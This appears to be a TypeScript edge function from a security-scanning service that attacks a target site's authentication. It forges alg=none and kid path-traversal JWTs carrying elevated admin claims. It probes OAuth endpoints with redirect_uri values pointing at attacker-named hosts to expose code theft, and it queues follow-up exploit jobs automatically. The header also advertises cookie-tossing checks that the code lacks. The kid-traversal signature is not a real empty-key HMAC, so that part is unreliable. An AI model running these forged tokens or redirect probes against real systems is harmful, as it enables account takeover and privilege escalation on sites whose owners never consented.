// Auth Confusion Suite — JWT (alg=none, key confusion, kid traversal),
// OAuth (loose redirect_uri), Session (cookie tossing, __Host- bypass).
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { safeFetch, readBodySafe } from "../_shared/safe-fetch.ts";
import { recordFinding } from "../_shared/findings-writer.ts";

const cors = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};
const db = () => createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!);

function b64url(s: string) {
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
}

function craftAlgNoneJwt(originalJwt: string): string | null {
  const parts = originalJwt.split(".");
  if (parts.length !== 3) return null;
  try {
    const payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));
    payload.role = "admin";
    payload.is_admin = true;
    payload.scope = "admin";
    const h = b64url(JSON.stringify({ alg: "none", typ: "JWT" }));
    const p = b64url(JSON.stringify(payload));
    return `${h}.${p}.`;
  } catch {
    return null;
  }
}

function craftKidTraversalJwt(originalJwt: string): string | null {
  const parts = originalJwt.split(".");
  if (parts.length !== 3) return null;
  try {
    const payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));
    const h = b64url(JSON.stringify({ alg: "HS256", typ: "JWT", kid: "../../../../dev/null" }));
    const p = b64url(JSON.stringify(payload));
    // sign with empty key (since /dev/null = empty)
    return `${h}.${p}.${b64url("AAAA")}`;
  } catch {
    return null;
  }
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: cors });
  try {
    const { targetId } = await req.json();
    const supa = db();
    const findings: any[] = [];

    // 1. JWT attacks — pull tokens from auth_profiles
    const { data: profiles } = await supa
      .from("auth_profiles")
      .select("target_id,bearer_token,cookie_header")
      .eq("target_id", targetId)
      .limit(5);
    const { data: target } = await supa.from("target_workspaces").select("domain").eq("id", targetId).maybeSingle();
    const baseUrl = target?.domain?.startsWith("http") ? target.domain : `https://${target?.domain}`;

    for (const p of profiles || []) {
      if (!p.bearer_token) continue;

      // Baseline gate: a forged-JWT "bypass" is only meaningful if the route
      // actually enforces auth in the first place. Without this check, any
      // homepage that returns 200 regardless of Authorization (the common
      // case — most homepages are public) produced a guaranteed false
      // "JWT auth bypass / exploited" finding on every single scan,
      // independent of whether real authentication logic exists at all.
      let routeEnforcesAuth = false;
      let unauthBody = "";
      try {
        const noAuthR = await safeFetch(baseUrl, { headers: { Authorization: "Bearer invalid.garbage.token" } }, 6000);
        unauthBody = await readBodySafe(noAuthR, 2000);
        routeEnforcesAuth = noAuthR.status === 401 || noAuthR.status === 403;
      } catch {
        /* network error — can't establish baseline, skip this profile */
      }

      if (!routeEnforcesAuth) continue; // route doesn't gate on auth — JWT bypass test is meaningless here

      const variants: { name: string; jwt: string | null }[] = [
        { name: "alg=none EoP", jwt: craftAlgNoneJwt(p.bearer_token) },
        { name: "kid path-traversal", jwt: craftKidTraversalJwt(p.bearer_token) },
      ];
      for (const v of variants) {
        if (!v.jwt) continue;
        try {
          const r = await safeFetch(baseUrl, { headers: { Authorization: `Bearer ${v.jwt}` } }, 6000);
          const body = await readBodySafe(r, 4000);
          // Require: (a) success where garbage token was rejected, AND
          // (b) response body actually differs from the rejected-baseline body
          // (proves the server returned real authenticated content, not just
          // a generic 200 error page that happens to use a 2xx status).
          const bypassed = r.status >= 200 && r.status < 300 && body !== unauthBody && body.length > 20;
          if (bypassed) {
            findings.push({
              target_id: targetId,
              title: `JWT ${v.name} accepted`,
              severity: "critical",
              description: `Route rejects garbage tokens (401/403) but accepted a forged JWT (${v.name}) with elevated claims and returned ${r.status} with distinct authenticated content. Authentication bypass / privilege escalation.`,
              affected_url: baseUrl,
              payload: v.jwt.slice(0, 200),
              vuln_class: "auth_bypass",
              confidence_score: 0.9,
              source: "auth-confusion-suite",
              proof_tier: "exploited",
              evidence: { status: r.status, technique: v.name, unauthStatus: 401 },
            });
          }
        } catch {}
      }
    }

    // 2. OAuth redirect_uri loose match
    if (baseUrl) {
      const candidates = ["/oauth/authorize", "/auth/authorize", "/connect/authorize", "/o/oauth2/auth"];
      for (const path of candidates) {
        for (const evil of ["https://attacker.example.com", `${baseUrl}.attacker.com`, `${baseUrl}@attacker.com`]) {
          try {
            const u = `${baseUrl}${path}?response_type=code&client_id=test&redirect_uri=${encodeURIComponent(evil)}`;
            const r = await safeFetch(u, {}, 5000);
            const body = await readBodySafe(r, 4000);
            if (r.status >= 300 && r.status < 400) {
              const loc = r.headers.get("location") || "";
              if (loc.includes("attacker")) {
                findings.push({
                  target_id: targetId,
                  title: `OAuth redirect_uri loose match: ${path}`,
                  severity: "high",
                  description: `OAuth endpoint accepted attacker-controlled redirect_uri (${evil}). Authorization-code theft possible.`,
                  affected_url: u,
                  payload: evil,
                  vuln_class: "oauth_misconfig",
                  confidence_score: 0.85,
                  source: "auth-confusion-suite",
                  proof_tier: "exploited",
                  evidence: { status: r.status, location: loc },
                });
              }
            } else if (r.status === 200 && body.includes(evil)) {
              findings.push({
                target_id: targetId,
                title: `OAuth redirect_uri reflected: ${path}`,
                severity: "medium",
                description: `redirect_uri reflected in response body without validation.`,
                affected_url: u,
                payload: evil,
                vuln_class: "oauth_misconfig",
                confidence_score: 0.6,
                source: "auth-confusion-suite",
                proof_tier: "suspected",
                evidence: { status: r.status },
              });
            }
          } catch {}
        }
      }
    }

    let queued = 0;
    for (const f of findings) {
      const res = await recordFinding({
        targetId,
        source: "auth-confusion-suite",
        category: "auth-confusion",
        severity: f.severity,
        title: f.title,
        description: f.description,
        payload: f.payload,
        proofTier: f.proof_tier || "suspected",
        evidence: f.evidence,
        vulnClass: f.vuln_class,
        request: { method: "GET", url: f.affected_url, headers: {} },
        response: { status: f.evidence?.status || 200, body: "" },
        autoEnqueueExploit: true,
      });
      if (res.exploitJobId) queued++;
    }
    await supa.from("scan_logs").insert({
      target_id: targetId,
      log_type: findings.length ? "result" : "info",
      message: `🔐 Auth-Confusion: ${findings.length} auth/JWT/OAuth issues, ${queued} exploit jobs queued`,
      metadata: { count: findings.length, queued },
    });

    return new Response(JSON.stringify({ findings: findings.length, queued }), {
      headers: { ...cors, "Content-Type": "application/json" },
    });
  } catch (e) {
    return new Response(JSON.stringify({ error: e instanceof Error ? e.message : String(e) }), {
      status: 200,
      headers: { ...cors, "Content-Type": "application/json" },
    });
  }
});
